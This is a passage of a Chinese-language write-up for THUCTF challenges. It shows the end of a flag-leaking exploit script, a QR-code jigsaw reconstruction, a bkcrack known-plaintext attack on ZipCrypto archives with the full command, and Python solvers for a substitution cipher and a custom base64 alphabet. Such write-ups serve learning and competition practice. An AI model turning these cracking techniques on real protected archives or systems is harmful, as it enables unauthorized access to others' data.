<span><span style="color: #403F53">    </span><span style="color: #994CC3">if</span><span style="color: #403F53"> bit </span><span style="color: #994CC3">==</span><span style="color: #403F53"> </span><span style="color: #AA0982">7</span><span style="color: #403F53">:</span></span>
<span><span style="color: #403F53">        result </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #4876D6">chr</span><span style="color: #403F53">(</span><span style="color: #4876D6">current</span><span style="color: #403F53">) </span><span style="color: #994CC3">+</span><span style="color: #403F53"> result</span></span>
<span><span style="color: #403F53">        </span><span style="color: #4876D6">print</span><span style="color: #403F53">(</span><span style="color: #4876D6">result</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">        </span><span style="color: #994CC3">if</span><span style="color: #403F53"> result.</span><span style="color: #0C969B">startswith</span><span style="color: #403F53">(</span><span style="color: #111111">&quot;</span><span style="color: #C96765">HUCTF{</span><span style="color: #111111">&quot;</span><span style="color: #403F53">):</span></span>
<span><span style="color: #403F53">            </span><span style="color: #994CC3">break</span></span>
<span><span style="color: #403F53">        current </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">0</span></span>
<span><span style="color: #403F53">        bit </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">0</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">else</span><span style="color: #403F53">:</span></span>
<span><span style="color: #403F53">        bit </span><span style="color: #994CC3">+=</span><span style="color: #403F53"> </span><span style="color: #AA0982">1</span></span>
<span></span>
<span><span style="color: #403F53">sh.</span><span style="color: #0C969B">interactive</span><span style="color: #403F53">()</span></span></code></pre></div></section>
<p><picture><source type="image/webp" srcset="/assets/darkroom-flag2.1027a35d.webp"><img srcset="/assets/darkroom-flag2.814d7071.png" loading="lazy" src="/assets/darkroom-flag2.814d7071.png" width="565" height="509" alt="flag2"></picture></p>
<h3 id="huavvei-mate" class="heading"><a href="#huavvei-mate" class="heading-anchor" aria-label="章节： Huavvei Mate" tabindex="-1"></a><span>Huavvei Mate</span></h3>
<h4 id="level-1-4" class="heading"><a href="#level-1-4" class="heading-anchor" aria-label="章节： Level 1" tabindex="-1"></a><span>Level 1</span></h4>
<p>首先将每块的图片下载下来<span class="mojikumi-line-end">，</span>进行拼图而不是真的华容道<span class="mojikumi-line-end">。</span>我是手动在 GIMP 里拼的<span class="mojikumi-line-end">。</span>可以参考 <a href="https://www.thonky.com/qr-code-tutorial/">QR Code Tutorial - Thonky.com</a> 和 <a href="https://en.wikipedia.org/wiki/QR_code">QR code - Wikipedia</a><span class="mojikumi-line-end">，</span>并使用 <a href="https://merri.cx/qrazybox/">QRazyBox</a> 辅助<span class="mojikumi-line-end">。</span></p>
<ol>
<li>把 finder pattern 拼出来<span class="mojikumi-line-end">。</span></li>
<li>把 timing pattern 拼出来<span class="mojikumi-line-end">。</span></li>
<li>把 alignment pattern 的主体部分拼上<span class="mojikumi-line-end">。</span></li>
<li>查表得知 ECC level 为 L<span class="mojikumi-line-end">，</span>mask pattern 为 3<span class="mojikumi-line-end">。</span>根据 flag 格式可以得知 input mode 是 byte<span class="mojikumi-line-end">，</span>开头几个字符是 <code>THUCTF{</code><span class="mojikumi-line-end">，</span>据此可以把最右边拼出来<span class="mojikumi-line-end">。</span></li>
<li>剩下的可以逐块进行尝试<span class="mojikumi-line-end">，</span>保证得到的是可见字符<span class="mojikumi-line-start">（</span>而且最好有一定语义<span class="mojikumi">）</span><span class="mojikumi-line-end">。</span></li>
</ol>
<p>最后得到二维码如下<span class="mojikumi-line-end">，</span>扫码得到 flag<span class="mojikumi-line-end">。</span></p>
<p><picture><source type="image/webp" srcset="/assets/huavvei-hard-qrcode.7080b81d.webp"><img srcset="/assets/huavvei-hard-qrcode.472db4b0.png" loading="lazy" src="/assets/huavvei-hard-qrcode.472db4b0.png" width="250" height="250" alt="qrcode"></picture></p>
<h3 id="基本功" class="heading"><a href="#基本功" class="heading-anchor" aria-label="章节： 基本功" tabindex="-1"></a><span>基本功</span></h3>
<h4 id="level-1-5" class="heading"><a href="#level-1-5" class="heading-anchor" aria-label="章节： Level 1" tabindex="-1"></a><span>Level 1</span></h4>
<p>附件的文件名提示了需要使用 <a href="https://github.com/kimci86/bkcrack">bkcrack</a><span class="mojikumi-line-end">，</span>即使用已知的部分明文来攻击不安全的 Zip 加密方式<span class="mojikumi-line-end">。</span></p>
<p>根据压缩包内已知的文件名 <code>chromedriver_<wbr>linux64<wbr>.<wbr>zip</code> 和文件大小<span class="mojikumi-line-end">，</span>在 <a href="https://chromedriver.storage.googleapis.com/index.html">https<wbr>://<wbr>chromedriver<wbr>.<wbr>storage<wbr>.<wbr>googleapis<wbr>.<wbr>com<wbr>/<wbr>index<wbr>.<wbr>html</a> 进行搜索<span class="mojikumi-line-end">，</span>发现是 89.0.4389.23<span class="mojikumi-line-end">。</span></p>
<p>下载后按照 bkcrack 的说明即可破解密码得到 flag<span class="mojikumi-line-end">。</span></p>
<p><picture><source type="image/webp" srcset="/assets/bkcrack-flag1.379db086.webp"><img srcset="/assets/bkcrack-flag1.bf50debe.png" loading="lazy" src="/assets/bkcrack-flag1.bf50debe.png" width="1247" height="775" alt="flag1"></picture></p>
<h4 id="level-2-3" class="heading"><a href="#level-2-3" class="heading-anchor" aria-label="章节： Level 2" tabindex="-1"></a><span>Level 2</span></h4>
<p>根据 pcapng 的固定不变的文件头<span class="mojikumi-line-start">（</span>参考 <a href="https://www.winpcap.org/ntar/draft/PCAP-DumpFileFormat.html#sectionshb">PCAP Next Generation Dump File Format</a><span class="mojikumi-line-end">，</span>也可以自己存一个和 forensics 的附件进行对比<span class="mojikumi-line-end">）</span>即可得到已知明文<span class="mojikumi-line-end">。</span>因为中间有一个可变的 block length<span class="mojikumi-line-end">，</span>需要使用 <code>bkcrack</code> 的 <code>-x</code> 选项提供分段的明文<span class="mojikumi-line-end">。</span></p>
<p><code>signature<wbr>.<wbr>pcapng</code>: <code>0a 0d 0d 0a</code></p>
<section class="code-block relative my-6 shadow" itemprop="hasPart" itemscope itemtype="https://schema.org/SoftwareSourceCode" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h5 class="text-3 text-footer" itemprop="programmingLanguage" aria-label="Shell 代码块" data-v-ad49d235>Shell</h5><ile-root id="ile-8"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-8--></div><div class="light:hidden" itemprop="text" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><code><span><span style="color: #82AAFF">bkcrack</span><span style="color: #D6DEEB"> </span><span style="color: #82AAFF">-C</span><span style="color: #D6DEEB"> </span><span style="color: #ECC48D">bkcrack_level2.zip</span><span style="color: #D6DEEB"> </span><span style="color: #82AAFF">-c</span><span style="color: #D6DEEB"> </span><span style="color: #ECC48D">flag.pcapng</span><span style="color: #D6DEEB"> </span><span style="color: #82AAFF">-P</span><span style="color: #D6DEEB"> </span><span style="color: #ECC48D">level2-known-plain.zip</span><span style="color: #D6DEEB"> </span><span style="color: #82AAFF">-p</span><span style="color: #D6DEEB"> </span><span style="color: #ECC48D">signature.pcapng</span><span style="color: #D6DEEB"> </span><span style="color: #82AAFF">-x</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">6</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">00004</span><span style="color: #ECC48D">d3c2b1a01000000ffffffffffffffff</span></span></code></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><code><span><span style="color: #4876D6">bkcrack</span><span style="color: #403F53"> </span><span style="color: #4876D6">-C</span><span style="color: #403F53"> </span><span style="color: #4876D6">bkcrack_level2.zip</span><span style="color: #403F53"> </span><span style="color: #4876D6">-c</span><span style="color: #403F53"> </span><span style="color: #4876D6">flag.pcapng</span><span style="color: #403F53"> </span><span style="color: #4876D6">-P</span><span style="color: #403F53"> </span><span style="color: #4876D6">level2-known-plain.zip</span><span style="color: #403F53"> </span><span style="color: #4876D6">-p</span><span style="color: #403F53"> </span><span style="color: #4876D6">signature.pcapng</span><span style="color: #403F53"> </span><span style="color: #4876D6">-x</span><span style="color: #403F53"> </span><span style="color: #AA0982">6</span><span style="color: #403F53"> </span><span style="color: #AA0982">00004</span><span style="color: #4876D6">d3c2b1a01000000ffffffffffffffff</span></span></code></pre></div></section>
<p><picture><source type="image/webp" srcset="/assets/bkcrack-flag2.f5cc83ea.webp"><img srcset="/assets/bkcrack-flag2.43ef3c05.png" loading="lazy" src="/assets/bkcrack-flag2.43ef3c05.png" width="893" height="261" alt="flag2"></picture></p>
<h2 id="crypto" class="heading"><a href="#crypto" class="heading-anchor" aria-label="章节： Crypto" tabindex="-1"></a><span>Crypto</span></h2>
<h3 id="easycrypto" class="heading"><a href="#easycrypto" class="heading-anchor" aria-label="章节： easycrypto" tabindex="-1"></a><span>easycrypto</span></h3>
<h4 id="level-1-6" class="heading"><a href="#level-1-6" class="heading-anchor" aria-label="章节： Level 1" tabindex="-1"></a><span>Level 1</span></h4>
<p>将 <code>cipher.txt</code> 输入到 <a href="https://quipqiup.com/">https<wbr>://<wbr>quipqiup<wbr>.<wbr>com<wbr>/</a> 即可得到 flag<span class="mojikumi-line-end">。</span></p>
<p><picture><source type="image/webp" srcset="/assets/easycrypto-flag1.9e1da931.webp"><img srcset="/assets/easycrypto-flag1.4248285c.png" loading="lazy" src="/assets/easycrypto-flag1.4248285c.png" width="1268" height="585" alt="flag1"></picture></p>
<h4 id="level-2-4" class="heading"><a href="#level-2-4" class="heading-anchor" aria-label="章节： Level 2" tabindex="-1"></a><span>Level 2</span></h4>
<p>通过反编译以及运行可以看出<span class="mojikumi-line-end">，</span><code>main</code> 是把 flag 按 <code>table.txt</code> 作为字母表进行 base64 编码<span class="mojikumi-line-end">，</span>并在最后输出字母表的第一位<span class="mojikumi-line-start">（</span>即 <code>A</code> 的密文<span class="mojikumi">）</span><span class="mojikumi-line-end">。</span></p>
<p>根据 level 1 可以得到一部分的密文对应关系<span class="mojikumi-line-end">，</span>再根据 flag 的开头是 <code>THUCTF{</code> 可以再得到一些<span class="mojikumi-line-end">。</span>剩下的可以随机尝试直到试出符合格式条件的 flag<span class="mojikumi-line-end">。</span></p>
<section class="code-block relative my-6 shadow" itemprop="hasPart" itemscope itemtype="https://schema.org/SoftwareSourceCode" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h5 class="text-3 text-footer" itemprop="programmingLanguage" aria-label="Python 代码块" data-v-ad49d235>Python</h5><ile-root id="ile-9"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-9--></div><div class="light:hidden" itemprop="text" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><code><span><span style="color: #C792EA">import</span><span style="color: #D6DEEB"> re</span></span>
<span><span style="color: #C792EA">import</span><span style="color: #D6DEEB"> string</span></span>
<span><span style="color: #C792EA">import</span><span style="color: #D6DEEB"> random</span></span>
<span><span style="color: #C792EA">from</span><span style="color: #D6DEEB"> base64 </span><span style="color: #C792EA">import</span><span style="color: #D6DEEB"> b64decode</span></span>
<span></span>
<span><span style="color: #D6DEEB">plaintext  </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">You are right, but The Legend of Zelda is an action-adventure game franchise created by the Japanese game designers Shigeru Miyamoto and Takashi Tezuka. It is primarily developed and published by Nintendo, although some portable installments and re-releases have been outsourced to Flagship, Vanpool, and Grezzo. The gameplay incorporates action-adventure and elements of action RPG games. THUCTF</span><span style="color: #82AAFF">{cryptography_is_interesting}</span><span style="color: #ECC48D"> VEhVQ1RGe A</span><span style="color: #D9F5DD">&quot;</span></span>
<span><span style="color: #D6DEEB">ciphertext </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">Xzi rmc mbdga, nia Agc Qcdcjy zl Ocqyr bw rj rpabzj-rytcjaimc drsc lmrjpgbwc pmcracy nx agc Erurjcwc drsc ycwbdjcmw Wgbdcmi Sbxrszaz rjy Arkrwgb Acoikr. Ba bw umbsrmbqx yctcqzucy rjy uinqbwgcy nx Jbjacjyz, rqagzidg wzsc uzmarnqc bjwarqqscjaw rjy mc-mcqcrwcw grtc nccj ziawzimpcy az Lqrdwgbu, Trjuzzq, rjy Dmcooz. Agc drscuqrx bjpzmuzmracw rpabzj-rytcjaimc rjy cqcscjaw zl rpabzj MUD drscw. AGIPAL</span><span style="color: #82AAFF">{pmxuazdmrugx_bw_bjacmcwabjd}</span><span style="color: #ECC48D"> TCgTV1MDc R</span><span style="color: #D9F5DD">&quot;</span></span>
<span><span style="color: #D6DEEB">encoded </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">TCgTV1MDc0qlSAN1S182XHSoXeM9</span><span style="color: #D9F5DD">&quot;</span></span>
<span><span style="color: #D6DEEB">table </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</span><span style="color: #D9F5DD">&quot;</span></span>
<span></span>
<span><span style="color: #C792EA">while</span><span style="color: #D6DEEB"> </span><span style="color: #FF5874">True</span><span style="color: #D6DEEB">:</span></span>
<span><span style="color: #D6DEEB">    d </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> {}</span></span>
<span><span style="color: #D6DEEB">    revd </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> {}</span></span>
<span><span style="color: #D6DEEB">    unused </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">set</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">table</span><span style="color: #D6DEEB">[</span><span style="color: #82AAFF">:</span><span style="color: #F78C6C">52</span><span style="color: #D6DEEB">])</span></span>
<span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> i </span><span style="color: #C792EA">in</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">range</span><span style="color: #D6DEEB">(</span><span style="color: #C5E478">len</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">ciphertext</span><span style="color: #D6DEEB">)):</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C792EA">if</span><span style="color: #D6DEEB"> plaintext[i] </span><span style="color: #C792EA">in</span><span style="color: #D6DEEB"> string.ascii_letters:</span></span>
<span><span style="color: #D6DEEB">            d[plaintext[i]] </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> ciphertext[i]</span></span>
<span><span style="color: #D6DEEB">            revd[ciphertext[i]] </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> plaintext[i]</span></span>
<span><span style="color: #D6DEEB">            </span><span style="color: #C792EA">if</span><span style="color: #D6DEEB"> ciphertext[i] </span><span style="color: #C792EA">in</span><span style="color: #D6DEEB"> unused:</span></span>
<span><span style="color: #D6DEEB">                unused.</span><span style="color: #B2CCD6">remove</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">ciphertext</span><span style="color: #D6DEEB">[</span><span style="color: #82AAFF">i</span><span style="color: #D6DEEB">])</span></span>
<span></span>
<span><span style="color: #D6DEEB">    new_table </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> {}</span></span>
<span><span style="color: #D6DEEB">    r </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">[</span><span style="color: #D6DEEB">i </span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> i </span><span style="color: #C792EA">in</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">range</span><span style="color: #D6DEEB">(</span><span style="color: #F78C6C">52</span><span style="color: #D6DEEB">)</span><span style="color: #D9F5DD">]</span></span>
<span><span style="color: #D6DEEB">    random.</span><span style="color: #B2CCD6">shuffle</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">r</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> i </span><span style="color: #C792EA">in</span><span style="color: #D6DEEB"> r:</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C792EA">if</span><span style="color: #D6DEEB"> table[i] </span><span style="color: #C792EA">in</span><span style="color: #D6DEEB"> d:</span></span>
<span><span style="color: #D6DEEB">            new_table[i] </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> d[table[i]]</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C792EA">else</span><span style="color: #D6DEEB">:</span></span>
<span><span style="color: #D6DEEB">            new_table[i] </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> unused.</span><span style="color: #B2CCD6">pop</span><span style="color: #D6DEEB">()</span></span>
<span><span style="color: #D6DEEB">            revd[new_table[i]] </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> table[i]</span></span>
<span></span>
<span><span style="color: #D6DEEB">    new_table </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">[</span><span style="color: #D6DEEB">new_table[i] </span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> i </span><span style="color: #C792EA">in</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">range</span><span style="color: #D6DEEB">(</span><span style="color: #F78C6C">52</span><span style="color: #D6DEEB">)</span><span style="color: #D9F5DD">]</span></span>
<span><span style="color: #D6DEEB">    new_table </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">&quot;&quot;</span><span style="color: #D6DEEB">.</span><span style="color: #B2CCD6">join</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">new_table</span><span style="color: #D6DEEB">) </span><span style="color: #C792EA">+</span><span style="color: #D6DEEB"> table[</span><span style="color: #F78C6C">52</span><span style="color: #D6DEEB">:]</span></span>
<span></span>
<span><span style="color: #D6DEEB">    encoded_decrypted </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">&quot;&quot;</span><span style="color: #D6DEEB">.</span><span style="color: #B2CCD6">join</span><span style="color: #D6DEEB">(</span><span style="color: #D9F5DD">[</span><span style="color: #82AAFF">revd</span><span style="color: #D6DEEB">[</span><span style="color: #82AAFF">x</span><span style="color: #D6DEEB">]</span><span style="color: #82AAFF"> </span><span style="color: #C792EA">if</span><span style="color: #82AAFF"> x </span><span style="color: #C792EA">in</span><span style="color: #82AAFF"> revd </span><span style="color: #C792EA">else</span><span style="color: #82AAFF"> x </span><span style="color: #C792EA">for</span><span style="color: #82AAFF"> x </span><span style="color: #C792EA">in</span><span style="color: #82AAFF"> encoded</span><span style="color: #D9F5DD">]</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">try</span><span style="color: #D6DEEB">:</span></span>
<span><span style="color: #D6DEEB">        flag </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #B2CCD6">b64decode</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">encoded_decrypted</span><span style="color: #D6DEEB">).</span><span style="color: #B2CCD6">decode</span><span style="color: #D6DEEB">()</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">except</span><span style="color: #D6DEEB">:</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C792EA">continue</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">if</span><span style="color: #D6DEEB"> re.</span><span style="color: #B2CCD6">match</span><span style="color: #D6DEEB">(</span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">THUCTF</span><span style="color: #F78C6C">\\</span><span style="color: #ECC48D">{[a-zA-Z0-9_]*</span><span style="color: #F78C6C">\\</span><span style="color: #ECC48D">}</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> flag</span><span style="color: #D6DEEB">):</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C5E478">print</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">flag</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> new_table</span><span style="color: #D6DEEB">)</span></span></code></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><code><span><span style="color: #994CC3">import</span><span style="color: #403F53"> re</span></span>
<span><span style="color: #994CC3">import</span><span style="color: #403F53"> string</span></span>
<span><span style="color: #994CC3">import</span><span style="color: #403F53"> random</span></span>
<span><span style="color: #994CC3">from</span><span style="color: #403F53"> base64 </span><span style="color: #994CC3">import</span><span style="color: #403F53"> b64decode</span></span>
<span></span>
<span><span style="color: #403F53">plaintext  </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #111111">&quot;</span><span style="color: #C96765">You are right, but The Legend of Zelda is an action-adventure game franchise created by the Japanese game designers Shigeru Miyamoto and Takashi Tezuka. It is primarily developed and published by Nintendo, although some portable installments and re-releases have been outsourced to Flagship, Vanpool, and Grezzo. The gameplay incorporates action-adventure and elements of action RPG games. THUCTF</span><span style="color: #4876D6">{cryptography_is_interesting}</span><span style="color: #C96765"> VEhVQ1RGe A</span><span style="color: #111111">&quot;</span></span>
<span><span style="color: #403F53">ciphertext </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #111111">&quot;</span><span style="color: #C96765">Xzi rmc mbdga, nia Agc Qcdcjy zl Ocqyr bw rj rpabzj-rytcjaimc drsc lmrjpgbwc pmcracy nx agc Erurjcwc drsc ycwbdjcmw Wgbdcmi Sbxrszaz rjy Arkrwgb Acoikr. Ba bw umbsrmbqx yctcqzucy rjy uinqbwgcy nx Jbjacjyz, rqagzidg wzsc uzmarnqc bjwarqqscjaw rjy mc-mcqcrwcw grtc nccj ziawzimpcy az Lqrdwgbu, Trjuzzq, rjy Dmcooz. Agc drscuqrx bjpzmuzmracw rpabzj-rytcjaimc rjy cqcscjaw zl rpabzj MUD drscw. AGIPAL</span><span style="color: #4876D6">{pmxuazdmrugx_bw_bjacmcwabjd}</span><span style="color: #C96765"> TCgTV1MDc R</span><span style="color: #111111">&quot;</span></span>
<span><span style="color: #403F53">encoded </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #111111">&quot;</span><span style="color: #C96765">TCgTV1MDc0qlSAN1S182XHSoXeM9</span><span style="color: #111111">&quot;</span></span>
<span><span style="color: #403F53">table </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #111111">&quot;</span><span style="color: #C96765">ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</span><span style="color: #111111">&quot;</span></span>
<span></span>
<span><span style="color: #994CC3">while</span><span style="color: #403F53"> </span><span style="color: #BC5454">True</span><span style="color: #403F53">:</span></span>
<span><span style="color: #403F53">    d </span><span style="color: #994CC3">=</span><span style="color: #403F53"> {}</span></span>
<span><span style="color: #403F53">    revd </span><span style="color: #994CC3">=</span><span style="color: #403F53"> {}</span></span>
<span><span style="color: #403F53">    unused </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #4876D6">set</span><span style="color: #403F53">(</span><span style="color: #4876D6">table</span><span style="color: #403F53">[</span><span style="color: #4876D6">:</span><span style="color: #AA0982">52</span><span style="color: #403F53">])</span></span>
<span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">for</span><span style="color: #403F53"> i </span><span style="color: #994CC3">in</span><span style="color: #403F53"> </span><span style="color: #4876D6">range</span><span style="color: #403F53">(</span><span style="color: #4876D6">len</span><span style="color: #403F53">(</span><span style="color: #4876D6">ciphertext</span><span style="color: #403F53">)):</span></span>
<span><span style="color: #403F53">        </span><span style="color: #994CC3">if</span><span style="color: #403F53"> plaintext[i] </span><span style="color: #994CC3">in</span><span style="color: #403F53"> string.ascii_letters:</span></span>
<span><span style="color: #403F53">            d[plaintext[i]] </span><span style="color: #994CC3">=</span><span style="color: #403F53"> ciphertext[i]</span></span>
<span><span style="color: #403F53">            revd[ciphertext[i]] </span><span style="color: #994CC3">=</span><span style="color: #403F53"> plaintext[i]</span></span>
<span><span style="color: #403F53">            </span><span style="color: #994CC3">if</span><span style="color: #403F53"> ciphertext[i] </span><span style="color: #994CC3">in</span><span style="color: #403F53"> unused:</span></span>
<span><span style="color: #403F53">                unused.</span><span style="color: #0C969B">remove</span><span style="color: #403F53">(</span><span style="color: #4876D6">ciphertext</span><span style="color: #403F53">[</span><span style="color: #4876D6">i</span><span style="color: #403F53">])</span></span>
<span></span>
<span><span style="color: #403F53">    new_table </span><span style="color: #994CC3">=</span><span style="color: #403F53"> {}</span></span>
<span><span style="color: #403F53">    r </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #111111">[</span><span style="color: #403F53">i </span><span style="color: #994CC3">for</span><span style="color: #403F53"> i </span><span style="color: #994CC3">in</span><span style="color: #403F53"> </span><span style="color: #4876D6">range</span><span style="color: #403F53">(</span><span style="color: #AA0982">52</span><span style="color: #403F53">)</span><span style="color: #111111">]</span></span>
<span><span style="color: #403F53">    random.</span><span style="color: #0C969B">shuffle</span><span style="color: #403F53">(</span><span style="color: #4876D6">r</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">for</span><span style="color: #403F53"> i </span><span style="color: #994CC3">in</span><span style="color: #403F53"> r:</span></span>
<span><span style="color: #403F53">        </span><span style="color: #994CC3">if</span><span style="color: #403F53"> table[i] </span><span style="color: #994CC3">in</span><span style="color: #403F53"> d:</span></span>
<span><span style="color: #403F53">            new_table[i] </span><span style="color: #994CC3">=</span><span style="color: #403F53"> d[table[i]]</span></span>
<span><span style="color: #403F53">        </span><span style="color: #994CC3">else</span><span style="color: #403F53">:</span></span>
<span><span style="color: #403F53">            new_table[i] </span><span style="color: #994CC3">=</span><span style="color: #403F53"> unused.</span><span style="color: #0C969B">pop</span><span style="color: #403F53">()</span></span>
<span><span style="color: #403F53">            revd[new_table[i]] </span><span style="color: #994CC3">=</span><span style="color: #403F53"> table[i]</span></span>
<span></span>
<span><span style="color: #403F53">    new_table </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #111111">[</span><span style="color: #403F53">new_table[i] </span><span style="color: #994CC3">for</span><span style="color: #403F53"> i </span><span style="color: #994CC3">in</span><span style="color: #403F53"> </span><span style="color: #4876D6">range</span><span style="color: #403F53">(</span><span style="color: #AA0982">52</span><span style="color: #403F53">)</span><span style="color: #111111">]</span></span>
<span><span style="color: #403F53">    new_table </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #111111">&quot;&quot;</span><span style="color: #403F53">.</span><span style="color: #0C969B">join</span><span style="color: #403F53">(</span><span style="color: #4876D6">new_table</span><span style="color: #403F53">) </span><span style="color: #994CC3">+</span><span style="color: #403F53"> table[</span><span style="color: #AA0982">52</span><span style="color: #403F53">:]</span></span>
<span></span>
<span><span style="color: #403F53">    encoded_decrypted </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #111111">&quot;&quot;</span><span style="color: #403F53">.</span><span style="color: #0C969B">join</span><span style="color: #403F53">(</span><span style="color: #111111">[</span><span style="color: #4876D6">revd</span><span style="color: #403F53">[</span><span style="color: #4876D6">x</span><span style="color: #403F53">]</span><span style="color: #4876D6"> </span><span style="color: #994CC3">if</span><span style="color: #4876D6"> x </span><span style="color: #994CC3">in</span><span style="color: #4876D6"> revd </span><span style="color: #994CC3">else</span><span style="color: #4876D6"> x </span><span style="color: #994CC3">for</span><span style="color: #4876D6"> x </span><span style="color: #994CC3">in</span><span style="color: #4876D6"> encoded</span><span style="color: #111111">]</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">try</span><span style="color: #403F53">:</span></span>
<span><span style="color: #403F53">        flag </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #0C969B">b64decode</span><span style="color: #403F53">(</span><span style="color: #4876D6">encoded_decrypted</span><span style="color: #403F53">).</span><span style="color: #0C969B">decode</span><span style="color: #403F53">()</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">except</span><span style="color: #403F53">:</span></span>
<span><span style="color: #403F53">        </span><span style="color: #994CC3">continue</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">if</span><span style="color: #403F53"> re.</span><span style="color: #0C969B">match</span><span style="color: #403F53">(</span><span style="color: #111111">&#39;</span><span style="color: #C96765">THUCTF</span><span style="color: #AA0982">\\</span><span style="color: #C96765">{[a-zA-Z0-9_]*</span><span style="color: #AA0982">\\</span><span style="color: #C96765">}</span><span style="color: #111111">&#39;</span><span style="color: #111111">,</span><span style="color: #4876D6"> flag</span><span style="color: #403F53">):</span></span>
<span><span style="color: #403F53">        </span><span style="color: #4876D6">print</span><span style="color: #403F53">(</span><span style="color: #4876D6">flag</span><span style="color: #111111">,</span><span style="color: #4876D6"> new_table</span><span style="color: #403F53">)</span></span></code></pre></div></section>
